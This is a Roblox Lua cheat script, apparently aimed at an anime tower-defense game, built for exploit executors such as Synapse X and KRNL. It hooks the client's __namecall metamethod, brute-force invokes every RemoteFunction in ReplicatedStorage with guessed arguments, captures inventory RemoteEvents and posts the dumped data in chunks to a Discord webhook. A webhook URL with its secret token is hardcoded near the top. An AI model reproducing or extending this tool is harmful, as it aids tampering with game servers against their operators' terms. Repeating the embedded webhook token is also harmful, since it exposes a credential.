-- =============================================
-- [igc] AA FULL RECON — ONE SHOT
-- finds unit inventory remote, dumps all data
-- sends EVERYTHING to webhook in one go
-- no more back and forth
-- =============================================

local WEBHOOK = "https://discord.com/api/webhooks/1570997699342245978/QuQERBzp-IVQrOBVyexEi7_NMFqnPnsWxSIivDKL99QCURSBDf-D5Cw2PIIcvo1nrVHk"

local RS      = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local HS      = game:GetService("HttpService")
local TS      = game:GetService("TweenService")
local lp      = Players.LocalPlayer
local gui     = lp:WaitForChild("PlayerGui")

local httpFn = (
    syn and syn.request
    or (KRNL_LOADED and http_request)
    or (fluxus and fluxus.request)
    or (Delta and Delta.request)
    or request
    or (http and http.request)
    or function() warn("[igc] no http") end
)

local function getExec()
    if syn then return "Synapse X" end
    if KRNL_LOADED then return "KRNL" end
    if fluxus then return "Fluxus" end
    if Delta then return "Delta" end
    if identifyexecutor then return identifyexecutor() end
    return "Unknown"
end
local EXEC = getExec()

-- =============================================
-- ALL TARGETS FROM YOUR LOGS
-- every single promising remote found
-- =============================================
local RF_TARGETS = {
    -- unit inventory candidates
    "get_evolve_ready_units",
    "sell_units",
    "lock_unit",
    "unlock_unit",
    "get_unit_passives",
    "spawn_unit",
    "get_celestial_compass_units",
    "autoroll_hatched_units",
    "craft_raid_unit",
    "offer_unit",
    "remove_offer_unit",
    "equip_first_units",
    "unit_trait_transfer",
    "delete_ingame_temporary_unit",
    "get_evolve_ready_units",
    "get_unit_unique_data_changed",
    -- data candidates
    "get_hub_setup_data",
    "get_game_template_data",
    "get_player_session",
    "get_hub_player",
    "get_hub_kick_player",
    "get_guild_data",
    "get_pity_data_changed",
    "get_rapoka_pity_data_changed",
    "get_dailymissions_data",
    "get_decompose_points_data",
    "get_battlepasses_data",
    "get_missions_quests_data",
    "get_trophy_shop_data",
    "get_bod_shop_data",
    "get_rashimap_shop_data",
    "get_modoka_shop_data",
    "get_gold_shop_data",
    "get_event_lottery_data",
    "get_unique_item_unique_data_changed",
    "get_dailymissions_data",
    "get_dailymissions_quests_data",
    -- player data
    "get_player_session",
    "claim_player_level_rewards",
    "reset_bought_items",
    "player_level_rewards_changed",
}

-- RE targets to listen on
local RE_TARGETS = {
    "inventory_changed",
    "unit_unique_data_changed",
    "unique_item_unique_data_changed",
    "pity_data_changed",
    "rapoka_pity_data_changed",
    "dailymissions_data_changed",
    "decompose_points_data_changed",
    "battlepasses_data_changed",
    "missions_quests_data_changed",
    "trophy_shop_data_changed",
    "bod_shop_data_changed",
    "guild_data_changed",
    "gold_shop_data_changed",
    "event_lottery_data_changed",
    "modoka_shop_data_changed",
}

-- arg combos to try on each RF
local ARG_SETS = {
    {label="()",       args={}},
    {label="(plr)",    args={lp}},
    {label="(uid)",    args={lp.UserId}},
    {label="(name)",   args={lp.Name}},
    {label="(true)",   args={true}},
    {label="(false)",  args={false}},
    {label="(1)",      args={1}},
    {label="(0)",      args={0}},
}

-- =============================================
-- CAPTURE
-- =============================================
local RESULTS = {}  -- {remote, args, data}
local RE_RESULTS = {} -- {remote, data}
local NC_LOG = {}   -- full namecall log

-- =============================================
-- UI SETUP
-- =============================================
if gui:FindFirstChild("AAOneShot") then gui.AAOneShot:Destroy() end

local SG = Instance.new("ScreenGui")
SG.Name="AAOneShot"; SG.ResetOnSpawn=false; SG.Parent=gui

local Main = Instance.new("Frame")
Main.Size=UDim2.new(0,315,0,480)
Main.Position=UDim2.new(0.5,-157,0.5,-240)
Main.BackgroundColor3=Color3.fromRGB(8,8,18)
Main.BorderSizePixel=0; Main.Active=true; Main.Draggable=true; Main.Parent=SG
Instance.new("UICorner",Main).CornerRadius=UDim.new(0,8)
local ms=Instance.new("UIStroke",Main); ms.Color=Color3.fromRGB(40,40,190); ms.Thickness=1

-- title
local TB=Instance.new("Frame")
TB.Size=UDim2.new(1,0,0,30); TB.BackgroundColor3=Color3.fromRGB(12,12,34)
TB.BorderSizePixel=0; TB.Parent=Main
Instance.new("UICorner",TB).CornerRadius=UDim.new(0,8)

local TL=Instance.new("TextLabel")
TL.Size=UDim2.new(1,-30,1,0); TL.Position=UDim2.new(0,10,0,0)
TL.BackgroundTransparency=1; TL.Text="[igc] AA Full Recon — One Shot"
TL.TextColor3=Color3.fromRGB(70,70,220); TL.TextSize=10
TL.Font=Enum.Font.Code; TL.TextXAlignment=Enum.TextXAlignment.Left; TL.Parent=TB

local XB=Instance.new("TextButton")
XB.Size=UDim2.new(0,20,0,20); XB.Position=UDim2.new(1,-24,0.5,-10)
XB.BackgroundColor3=Color3.fromRGB(130,20,20); XB.Text="✕"
XB.TextColor3=Color3.fromRGB(255,255,255); XB.TextSize=10
XB.Font=Enum.Font.GothamBold; XB.BorderSizePixel=0; XB.Parent=TB
Instance.new("UICorner",XB).CornerRadius=UDim.new(0,4)
XB.MouseButton1Click:Connect(function() SG:Destroy() end)

-- webhook
local WHB=Instance.new("TextBox")
WHB.Size=UDim2.new(1,-20,0,24); WHB.Position=UDim2.new(0,10,0,38)
WHB.BackgroundColor3=Color3.fromRGB(11,11,26); WHB.Text=""
WHB.PlaceholderText="https://discord.com/api/webhooks/..."
WHB.TextColor3=Color3.fromRGB(150,150,230)
WHB.PlaceholderColor3=Color3.fromRGB(55,55,95)
WHB.TextSize=10; WHB.Font=Enum.Font.Code
WHB.ClearTextOnFocus=false; WHB.BorderSizePixel=0; WHB.Parent=Main
Instance.new("UICorner",WHB).CornerRadius=UDim.new(0,4)
Instance.new("UIStroke",WHB).Color=Color3.fromRGB(35,35,130)

-- status
local SL=Instance.new("TextLabel")
SL.Size=UDim2.new(1,-20,0,20); SL.Position=UDim2.new(0,10,0,70)
SL.BackgroundColor3=Color3.fromRGB(10,10,24); SL.BorderSizePixel=0
SL.Text=" paste webhook → RUN — does everything at once"
SL.TextColor3=Color3.fromRGB(100,100,160); SL.TextSize=10
SL.Font=Enum.Font.Code; SL.Parent=Main
Instance.new("UICorner",SL).CornerRadius=UDim.new(0,4)

local function setStat(msg,col)
    SL.Text=" "..msg
    SL.TextColor3=col or Color3.fromRGB(55,205,90)
end

-- scroll
local scrollBg=Instance.new("Frame")
scrollBg.Size=UDim2.new(1,-20,0,290); scrollBg.Position=UDim2.new(0,10,0,98)
scrollBg.BackgroundColor3=Color3.fromRGB(6,6,16); scrollBg.BorderSizePixel=0; scrollBg.Parent=Main
Instance.new("UICorner",scrollBg).CornerRadius=UDim.new(0,6)
Instance.new("UIStroke",scrollBg).Color=Color3.fromRGB(30,30,110)

local scroll=Instance.new("ScrollingFrame")
scroll.Size=UDim2.new(1,-8,1,-8); scroll.Position=UDim2.new(0,4,0,4)
scroll.BackgroundTransparency=1; scroll.BorderSizePixel=0
scroll.ScrollBarThickness=4
scroll.ScrollBarImageColor3=Color3.fromRGB(50,50,180)
scroll.CanvasSize=UDim2.new(0,0,0,0); scroll.Parent=scrollBg

local layout=Instance.new("UIListLayout")
layout.SortOrder=Enum.SortOrder.LayoutOrder
layout.Padding=UDim.new(0,2); layout.Parent=scroll

local lc=0
local wlines={}

local function addLine(txt,col)
    lc=lc+1
    table.insert(wlines,txt)
    local lb=Instance.new("TextLabel")
    lb.Size=UDim2.new(1,-8,0,0)
    lb.AutomaticSize=Enum.AutomaticSize.Y
    lb.BackgroundTransparency=1
    lb.Text=txt; lb.TextColor3=col or Color3.fromRGB(180,180,220)
    lb.TextSize=10; lb.Font=Enum.Font.Code
    lb.TextXAlignment=Enum.TextXAlignment.Left
    lb.TextWrapped=true; lb.LayoutOrder=lc; lb.Parent=scroll
    task.defer(function()
        scroll.CanvasSize=UDim2.new(0,0,0,layout.AbsoluteContentSize.Y+8)
        scroll.CanvasPosition=Vector2.new(0,math.huge)
    end)
end

local function clearLines()
    for _,c in ipairs(scroll:GetChildren()) do
        if c:IsA("TextLabel") then c:Destroy() end
    end
    lc=0; wlines={}; scroll.CanvasSize=UDim2.new(0,0,0,0)
end

-- counters
local function mkC(lbl,x,w)
    local F=Instance.new("Frame")
    F.Size=UDim2.new(0,w,0,32); F.Position=UDim2.new(0,x,0,396)
    F.BackgroundColor3=Color3.fromRGB(10,10,22); F.BorderSizePixel=0; F.Parent=Main
    Instance.new("UICorner",F).CornerRadius=UDim.new(0,4)
    local NL=Instance.new("TextLabel")
    NL.Size=UDim2.new(1,0,0.6,0); NL.BackgroundTransparency=1
    NL.Text="0"; NL.TextColor3=Color3.fromRGB(80,205,120)
    NL.TextSize=13; NL.Font=Enum.Font.GothamBold; NL.Parent=F
    local LL=Instance.new("TextLabel")
    LL.Size=UDim2.new(1,0,0.4,0); LL.Position=UDim2.new(0,0,0.6,0)
    LL.BackgroundTransparency=1; LL.Text=lbl
    LL.TextColor3=Color3.fromRGB(65,65,120); LL.TextSize=9; LL.Font=Enum.Font.Code; LL.Parent=F
    return NL
end

local c1=mkC("rf hits",   10, 70)
local c2=mkC("re hits",   85, 70)
local c3=mkC("nc calls", 160, 70)
local c4=mkC("total",    235, 70)

task.spawn(function()
    while SG.Parent do
        c1.Text=tostring(#RESULTS)
        c2.Text=tostring(#RE_RESULTS)
        c3.Text=tostring(#NC_LOG)
        c4.Text=tostring(#RESULTS+#RE_RESULTS)
        task.wait(1)
    end
end)

-- =============================================
-- UTILS
-- =============================================
local function fmt(v,d)
    d=d or 0
    if d>5 then return "..." end
    if type(v)=="string" then return '"'..v:sub(1,200)..'"' end
    if type(v)=="number" or type(v)=="boolean" then return tostring(v) end
    if type(v)=="table" then
        local out,n={},0
        for k,val in pairs(v) do
            n=n+1
            if n>40 then table.insert(out,"..."); break end
            table.insert(out,tostring(k).."="..fmt(val,d+1))
        end
        return "{"..table.concat(out,", ").."}"
    end
    if type(v)=="userdata" then
        local ok,nm=pcall(function() return v.Name end)
        return ok and "[Inst:"..nm.."]" or "[ud]"
    end
    return tostring(v)
end

local function ts() return os.date("%H:%M:%S") end

local function deepDump(val,prefix,depth)
    depth=depth or 0; prefix=prefix or ""
    if depth>6 then addLine(prefix.."...",Color3.fromRGB(100,100,140)); return end
    if type(val)=="table" then
        local n=0
        for k,v in pairs(val) do
            n=n+1
            if n>50 then addLine(prefix.."...+"..tostring(n).." more",Color3.fromRGB(100,100,120)); break end
            local key=prefix.."["..tostring(k).."]"
            if type(v)=="table" then
                addLine(key.." = {",Color3.fromRGB(180,160,255))
                deepDump(v,prefix.."  ",depth+1)
                addLine(prefix.."}",Color3.fromRGB(180,160,255))
            elseif type(v)=="string" then
                local isUUID=v:match("^%x+%-%x+%-%x+%-%x+%-%x+$")
                local isCurly=v:match("^{%x+%-%x+%-%x+%-%x+%-%x+}$")
                local col=(isUUID or isCurly) and Color3.fromRGB(80,255,160) or Color3.fromRGB(220,220,180)
                addLine(key..'="'..v..'"',col)
            elseif type(v)=="number" or type(v)=="boolean" then
                addLine(key.."="..tostring(v),Color3.fromRGB(255,180,80))
            elseif type(v)=="userdata" then
                local ok,nm=pcall(function() return v.Name end)
                addLine(key.."=[Inst:"..(ok and nm or "?").."]",Color3.fromRGB(150,150,200))
            else
                addLine(key.."="..tostring(v),Color3.fromRGB(180,180,180))
            end
        end
        if n==0 then addLine(prefix.."(empty)",Color3.fromRGB(80,80,100)) end
    else
        addLine(prefix..tostring(val),Color3.fromRGB(220,220,180))
    end
end

-- =============================================
-- WEBHOOK
-- =============================================
local function sendWH(title, lines)
    local wh=WHB.Text
    if not wh:find("discord.com/api/webhooks") then return end
    local body=table.concat(lines,"\n")
    local chunks={}
    for i=1,#body,1900 do table.insert(chunks,body:sub(i,i+1899)) end
    for idx,chunk in ipairs(chunks) do
        local t2=#chunks>1 and (title.." ["..idx.."/"..#chunks.."]") or title
        pcall(function()
            httpFn({
                Url=wh, Method="POST",
                Headers={["Content-Type"]="application/json"},
                Body=HS:JSONEncode({
                    username="[igc] AA Recon",
                    embeds={{
                        title=t2, description=chunk, color=0x2244FF,
                        footer={text=EXEC.." · "..lp.Name.." · "..lp.UserId}
                    }}
                })
            })
        end)
        if idx<#chunks then task.wait(1.2) end
    end
end

-- =============================================
-- NAMECALL HOOK
-- =============================================
local oldNC
local function armNC()
    if not hookmetamethod then return end
    oldNC=hookmetamethod(game,"__namecall",function(self,...)
        if checkcaller and checkcaller() then return oldNC(self,...) end
        local method=getnamecallmethod()
        local tracked={InvokeServer=true,FireServer=true,InvokeClient=true,FireClient=true}
        if tracked[method] then
            local fp="?"
            pcall(function() fp=self:GetFullName() end)
            local rets=table.pack(oldNC(self,...))
            local entry={t=ts(),path=fp,method=method,args={},rets={}}
            for i,a in ipairs({...}) do entry.args[i]=fmt(a) end
            for i=1,rets.n do entry.rets[i]=fmt(rets[i]) end
            table.insert(NC_LOG,entry)
            return table.unpack(rets,1,rets.n)
        end
        return oldNC(self,...)
    end)
end

-- =============================================
-- RE LISTENER
-- =============================================
local function listenREs()
    for _,v in ipairs(RS:GetDescendants()) do
        if v:IsA("RemoteEvent") then
            local fp=v:GetFullName()
            local n=v.Name:lower()
            local isTarget=false
            for _,t in ipairs(RE_TARGETS) do
                if n:find(t) then isTarget=true; break end
            end
            if isTarget then
                v.OnClientEvent:Connect(function(...)
                    local args={...}
                    local entry={t=ts(),path=fp,data={}}
                    for i,a in ipairs(args) do entry.data[i]=fmt(a) end
                    table.insert(RE_RESULTS,entry)
                    addLine("⚡ RE: "..fp,Color3.fromRGB(255,220,50))
                    deepDump(args,"  ")
                end)
            end
        end
    end
end

-- =============================================
-- MAIN RUN
-- =============================================
local function runAll()
    clearLines(); RESULTS={}; RE_RESULTS={}; NC_LOG={}

    addLine("== [igc] AA Full Recon ==",Color3.fromRGB(80,180,255))
    addLine("player: "..lp.Name.." ("..lp.UserId..")",Color3.fromRGB(150,150,200))
    addLine("executor: "..EXEC,Color3.fromRGB(150,150,200))
    addLine("",nil)

    -- arm hooks
    setStat("arming hooks...",Color3.fromRGB(230,170,30))
    armNC()
    listenREs()
    addLine("hooks armed ✓",Color3.fromRGB(55,205,90))
    addLine("",nil)

    -- phase 1: invoke all RF targets
    setStat("invoking RF targets...",Color3.fromRGB(230,170,30))
    addLine("== PHASE 1: RF Invoke ==",Color3.fromRGB(100,180,255))
    addLine("",nil)

    local rfHits=0

    for _,name in ipairs(RF_TARGETS) do
        local rf=RS:FindFirstChild(name,true)
        if rf and rf:IsA("RemoteFunction") then
            addLine("── "..rf:GetFullName(),Color3.fromRGB(130,130,180))

            for _,combo in ipairs(ARG_SETS) do
                local ok,res=pcall(function()
                    return rf:InvokeServer(table.unpack(combo.args))
                end)
                if ok and res~=nil then
                    rfHits=rfHits+1
                    addLine("⚡ args "..combo.label.." → GOT DATA:",Color3.fromRGB(80,255,160))
                    deepDump(res,"  ")
                    addLine("",nil)
                    table.insert(RESULTS,{
                        path=rf:GetFullName(),
                        args=combo.label,
                        data=fmt(res)
                    })
                    break
                end
                task.wait(0.08)
            end
        end
    end

    addLine("RF hits: "..rfHits,Color3.fromRGB(255,220,50))
    addLine("",nil)

    -- phase 2: brute scan ALL RFs for anything with data
    setStat("brute scanning all RFs...",Color3.fromRGB(230,170,30))
    addLine("== PHASE 2: Brute All RFs ==",Color3.fromRGB(100,180,255))
    addLine("",nil)

    local brute=0
    for _,v in ipairs(RS:GetDescendants()) do
        if v:IsA("RemoteFunction") then
            local ok,res=pcall(function() return v:InvokeServer() end)
            if ok and res~=nil then
                brute=brute+1
                local n=v.Name:lower()
                local isUnit=n:find("unit") or n:find("inv") or n:find("equip")
                    or n:find("sell") or n:find("lock") or n:find("spawn")
                local col=isUnit and Color3.fromRGB(80,255,160) or Color3.fromRGB(180,220,180)
                addLine((isUnit and "⚡" or "·").." "..v:GetFullName(),col)
                if isUnit then
                    deepDump(res,"  ")
                    addLine("",nil)
                    table.insert(RESULTS,{
                        path=v:GetFullName(),
                        args="()",
                        data=fmt(res)
                    })
                end
            end
            task.wait(0.05)
        end
    end

    addLine("brute hits: "..brute,Color3.fromRGB(255,220,50))
    addLine("",nil)

    -- phase 3: wait for RE events (open units tab now)
    setStat("waiting for RE events (open Units tab)...",Color3.fromRGB(230,170,30))
    addLine("== PHASE 3: RE Events (open Units tab now) ==",Color3.fromRGB(100,180,255))
    addLine("open your Units collection tab in-game now...",Color3.fromRGB(230,170,30))
    task.wait(8)
    addLine("RE events caught: "..#RE_RESULTS,Color3.fromRGB(255,220,50))
    addLine("",nil)

    -- phase 4: namecall log summary
    addLine("== PHASE 4: Namecall Log ==",Color3.fromRGB(100,180,255))
    addLine("total calls captured: "..#NC_LOG,Color3.fromRGB(255,220,50))
    for i,h in ipairs(NC_LOG) do
        if i>60 then addLine("...+"..(#NC_LOG-60).." more",Color3.fromRGB(100,100,120)); break end
        local n=h.path:lower()
        local isUnit=n:find("unit") or n:find("inv") or n:find("offer") or n:find("trade")
        if isUnit then
            addLine("⚡ "..h.t.." "..h.path.." "..h.method,Color3.fromRGB(80,255,160))
            if #h.rets>0 then addLine("  → "..table.concat(h.rets," | "),Color3.fromRGB(255,220,50)) end
        end
    end
    addLine("",nil)

    -- done
    setStat("done — sending to Discord...",Color3.fromRGB(230,170,30))
    addLine("== SENDING TO DISCORD ==",Color3.fromRGB(80,180,255))

    -- build webhook reports
    -- R1: RF hits
    do
        local lines={
            "**[igc] AA Full Recon**",
            "**Player:** "..lp.Name.." (`"..lp.UserId.."`)",
            "**Executor:** "..EXEC,
            "",
            "**== RF Invoke Hits: "..#RESULTS.." ==**",
            "remotes that returned data",
            "",
        }
        for _,r in ipairs(RESULTS) do
            table.insert(lines,"⚡ `"..r.path.."` args:"..r.args)
            table.insert(lines,"  → "..r.data:sub(1,300))
            table.insert(lines,"")
        end
        if #RESULTS==0 then table.insert(lines,"_no hits_") end
        sendWH("AA Recon — RF Hits",lines)
    end

    task.wait(1.5)

    -- R2: RE events
    do
        local lines={
            "**== RE Events: "..#RE_RESULTS.." ==**",
            "server→client fires caught",
            "",
        }
        for i,e in ipairs(RE_RESULTS) do
            if i>40 then break end
            table.insert(lines,"⚡ **"..e.t.."** `"..e.path.."`")
            if #e.data>0 then table.insert(lines,"  **data: "..table.concat(e.data," | ").."**") end
            table.insert(lines,"")
        end
        if #RE_RESULTS==0 then table.insert(lines,"_no RE events — open Units tab while running_") end
        sendWH("AA Recon — RE Events",lines)
    end

    task.wait(1.5)

    -- R3: full namecall
    do
        local lines={
            "**== Namecall Log: "..#NC_LOG.." ==**",
            "every remote called during session",
            "",
        }
        for i,h in ipairs(NC_LOG) do
            if i>80 then table.insert(lines,"...+"..(#NC_LOG-80).." more"); break end
            local n=h.path:lower()
            local isUnit=n:find("unit") or n:find("inv") or n:find("offer") or n:find("trade")
            local kw=isUnit and "⚡" or "·"
            table.insert(lines,kw.." **"..h.t.."** `"..h.path.."` "..h.method)
            if #h.rets>0 then table.insert(lines,"  → "..table.concat(h.rets," | ")) end
        end
        sendWH("AA Recon — Namecall",lines)
    end

    task.wait(1.5)

    -- R4: brute all results (every RF that returned anything)
    do
        local lines={
            "**== Brute RF Scan: "..brute.." hits ==**",
            "every RF that returned non-nil",
            "",
        }
        for _,v in ipairs(RS:GetDescendants()) do
            if v:IsA("RemoteFunction") then
                local ok,res=pcall(function() return v:InvokeServer() end)
                if ok and res~=nil then
                    table.insert(lines,"`"..v:GetFullName().."` → "..fmt(res):sub(1,200))
                end
            end
        end
        sendWH("AA Recon — All RF Results",lines)
    end

    setStat("ALL DONE ✓ — check Discord",Color3.fromRGB(80,255,160))
    addLine("",nil)
    addLine("ALL DONE — check Discord ✓",Color3.fromRGB(80,255,160))
end

-- buttons
local RunBtn=Instance.new("TextButton")
RunBtn.Size=UDim2.new(1,-20,0,32); RunBtn.Position=UDim2.new(0,10,0,436)
RunBtn.BackgroundColor3=Color3.fromRGB(25,25,150); RunBtn.Text="[ RUN FULL RECON — ONE SHOT ]"
RunBtn.TextColor3=Color3.fromRGB(170,170,255); RunBtn.TextSize=12
RunBtn.Font=Enum.Font.GothamBold; RunBtn.BorderSizePixel=0; RunBtn.Parent=Main
Instance.new("UICorner",RunBtn).CornerRadius=UDim.new(0,6)

local running=false

RunBtn.MouseButton1Click:Connect(function()
    if running then setStat("already running...",Color3.fromRGB(230,170,30)); return end
    local wh=WHB.Text
    if not wh:find("discord.com/api/webhooks") then
        setStat("paste webhook first",Color3.fromRGB(230,60,60)); return
    end
    running=true
    RunBtn.Text="[ RUNNING... ]"
    RunBtn.BackgroundColor3=Color3.fromRGB(10,10,80)
    task.spawn(function()
        runAll()
        running=false
        RunBtn.Text="[ RUN FULL RECON — ONE SHOT ]"
        RunBtn.BackgroundColor3=Color3.fromRGB(25,25,150)
    end)
end)

print("[igc] AA Full Recon loaded on "..EXEC.." — paste webhook and RUN")
